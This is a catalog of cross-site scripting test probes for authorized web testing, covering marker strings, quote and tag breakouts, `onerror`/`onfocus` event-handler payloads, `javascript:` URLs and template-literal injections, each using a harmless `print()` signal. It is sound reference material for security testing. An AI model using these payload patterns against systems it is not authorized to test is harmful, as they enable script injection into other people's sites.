# Minimal Authorized-Test Probe Catalog

Use only on systems you are authorized to test. These probes confirm parsing or local execution and intentionally omit credential theft, data export, and external exfiltration.

| Probe | Intended context | Prerequisite | Expected observation | Why useful |
| --- | --- | --- | --- | --- |
| `mx7Qa91Z` | Any input | None | Exact marker appears in response or DOM | Maps data flow without special-character filtering noise. |
| `mx7Qa91Z"Q` | Double-quoted attribute or JS string | Marker reflection known | Raw/DOM comparison shows quote encoding or termination | Identifies quote boundary before an execution test. |
| `mx7Qa91Z'Q` | Single-quoted attribute or JS string | Marker reflection known | Single-quote handling is visible | Separates single-quote escaping from generic filtering. |
| `<xss-marker>` | HTML text | Literal angle brackets reach final parser | Browser creates an inert custom element | Confirms HTML parsing without executing script. |
| `" autofocus onfocus=print() x="` | Double-quoted attribute | Can terminate attribute; injected attributes allowed | `print()` occurs when autofocus behavior is supported | Compact local confirmation that also repairs following markup. |
| `<img src=x onerror=print()>` | HTML parsed by a sink | New elements and event attributes survive | Browser invokes local print on failed image load | Useful where a script tag is inert, including common `innerHTML` cases. |
| `javascript:print()` | Navigation URL attribute | Attacker controls complete URL and protocol is not allowlisted | Local signal only after normal link activation | Tests protocol validation separately from HTML breakout. |
| `</script><img src=x onerror=print()>` | Server-rendered script data | Script terminator reaches HTML parser | A later element executes local signal | Tests HTML parsing before JavaScript parsing. |
| `';print()//` | Single-quoted JavaScript string | Quote can terminate and suffix can be commented safely | Local signal with valid surrounding script | Tests JavaScript grammar, not HTML markup. |
| `${print()}` | JavaScript template literal | Marker is inside an evaluated template literal | Local signal during template evaluation | Template expressions do not need to end backticks. |
| `{"name":"mx7Qa91Z"}` | JSON body/bootstrap data | Endpoint accepts JSON | JSON remains valid and field can be traced | Separates data serialization from a later unsafe consumer. |
| `#mx7Qa91Z` | Fragment-driven DOM path | Script reads `location.hash` | Marker appears in live DOM or debugger | Fragment is not sent to server, helping identify pure DOM flow. |
| `?returnUrl=https://example.invalid/marker` | jQuery/DOM URL assignment | URL parameter reaches `href`/navigation sink | DOM property shows assigned URL | Establishes URL sink flow before testing allowed schemes. |

## Sources

- https://portswigger.net/web-security/cross-site-scripting/contexts
- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
